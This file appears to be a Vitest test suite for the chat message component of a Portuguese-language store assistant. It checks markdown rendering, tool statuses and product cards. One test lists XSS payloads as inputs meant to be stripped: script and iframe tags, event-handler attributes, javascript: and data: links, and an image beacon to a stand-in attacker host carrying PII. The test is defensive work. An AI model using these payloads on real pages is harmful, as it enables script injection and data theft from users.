import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { MessageView } from "@/components/chat/message-view";
import type { ChatMessage } from "@/lib/chat/types";
import { getMessages } from "@/lib/i18n";
import { assembleMessage } from "@/test/fixtures";

const messages = getMessages();

function assistant(text: string): ChatMessage {
  return { id: "m1", role: "assistant", parts: [{ type: "text", text, state: "done" }] };
}

describe("MessageView", () => {
  it("renders the plain-text answer as markdown and hides metadata", async () => {
    const message = await assembleMessage("plain-text");
    message.parts = [
      ...message.parts,
      { type: "text", text: "Temos **violões** em promoção.", state: "done" },
    ];
    const { container } = render(<MessageView message={message} />);

    expect(screen.getByText(/Eu sou a Melody/)).toBeInTheDocument();
    // Streamdown renders bold as a styled span.
    expect(container.querySelector('[data-streamdown="strong"]')).toHaveTextContent("violões");
    expect(container).not.toHaveTextContent("greeting");
    expect(container).not.toHaveTextContent("claude-haiku");
  });

  it("neutralizes hostile markdown", () => {
    const hostile = [
      "<script>alert(1)</script>",
      '<img src=x onerror="alert(1)">',
      '<iframe src="https://x"></iframe>',
      "![](https://attacker.test/?q=pii)",
      "[a](javascript:alert(1))",
      "[b](data:text/html;base64,xx)",
      "<javascript:alert(1)>",
      "[c][ref]\n\n[ref]: javascript:alert(1)",
      "![d][img]\n\n[img]: https://attacker.test/ref.png",
      "[e](JaVaScRiPt:alert(1))",
      "[f](&#106;avascript:alert(1))",
      "[g](vbscript:msgbox(1))",
      "[x](xmpp:attacker@evil.test)",
      "[y](blob:https://evil.test/1234)",
      "[h](//attacker.test/x)",
      '<a href="javascript:alert(1)">i</a>',
      '<svg onload="alert(1)"></svg>',
      "[ ](https://attacker.test/blank)",
      "[loja](https://emporio.test/politicas)",
      "[site](http://emporio.test/)",
      "[email](mailto:sac@emporio.test)",
    ].join("\n\n");
    const { container } = render(<MessageView message={assistant(hostile)} />);

    // Scoped to the answer bubble: the Melody avatar renders its own decorative icon.
    const answer = screen.getByTestId("assistant-text");
    expect(answer.querySelector("img, iframe, script, svg")).toBeNull();
    expect(container).not.toHaveTextContent(/blocked/i);
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual([
      "https://emporio.test/politicas",
      "http://emporio.test/",
      "mailto:sac@emporio.test",
    ]);
    const safe = screen.getByRole("link", { name: "loja" });
    expect(safe).toHaveAttribute("href", "https://emporio.test/politicas");
    expect(safe).toHaveAttribute("target", "_blank");
    expect(safe.getAttribute("rel")).toContain("noopener");
  });

  it("renders tool-products as status, then cards, then text", async () => {
    const message = await assembleMessage("tool-products");
    const { container } = render(<MessageView message={message} />);

    const status = screen.getByRole("status");
    expect(status).toHaveAttribute("data-state", "done");
    expect(status).toHaveTextContent(messages.toolsDone.search_products);
    const cards = screen.getAllByRole("article");
    expect(cards).toHaveLength(2);
    const text = screen.getByText(/Encontrei estas opções/);

    const follows = (a: Node, b: Node) =>
      a.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING;
    expect(follows(status, cards[0])).toBeTruthy();
    expect(follows(cards[1], text)).toBeTruthy();
    expect(container).not.toHaveTextContent("search_products");
  });

  it("renders tool-error as a failed status without the error code", async () => {
    const message = await assembleMessage("tool-error");
    const { container } = render(<MessageView message={message} />);
    expect(screen.getByRole("status")).toHaveAttribute("data-state", "failed");
    expect(container).not.toHaveTextContent("verification_failed");
    expect(screen.getByText(/Não consegui confirmar os dados/)).toBeInTheDocument();
  });

  it("shows each product card once per answer, even when two tools emit it", () => {
    const card = (id: number, name: string) => ({
      id,
      name,
      categoryId: 1,
      priceBrl: 599.9,
      promoPriceBrl: null,
      discountPercent: null,
      availability: "in_stock",
    });
    const message = {
      id: "m3",
      role: "assistant",
      parts: [
        { type: "data-products", id: "p1", data: { products: [card(81, "Yamaha C40")] } },
        {
          type: "data-products",
          id: "p2",
          data: { products: [card(81, "Yamaha C40"), card(82, "Yamaha C70")] },
        },
      ],
    } as unknown as ChatMessage;
    render(<MessageView message={message} />);
    expect(screen.getAllByRole("article")).toHaveLength(2);
    expect(screen.getAllByText("Yamaha C40")).toHaveLength(1);
  });

  it("ignores unknown data parts", () => {
    const message = {
      id: "m2",
      role: "assistant",
      parts: [
        { type: "data-unknown", data: { secret: "x-internal" } },
        { type: "text", text: "Oi", state: "done" },
      ],
    } as unknown as ChatMessage;
    const { container } = render(<MessageView message={message} />);
    expect(container).not.toHaveTextContent("x-internal");
    expect(screen.getByText("Oi")).toBeInTheDocument();
  });

  it("renders a user message as plain text", () => {
    const user: ChatMessage = {
      id: "u1",
      role: "user",
      parts: [{ type: "text", text: "**Oi**" }],
    };
    const { container } = render(<MessageView message={user} />);
    expect(container.querySelector('strong, [data-streamdown="strong"]')).toBeNull();
    expect(screen.getByText("**Oi**")).toBeInTheDocument();
  });
});
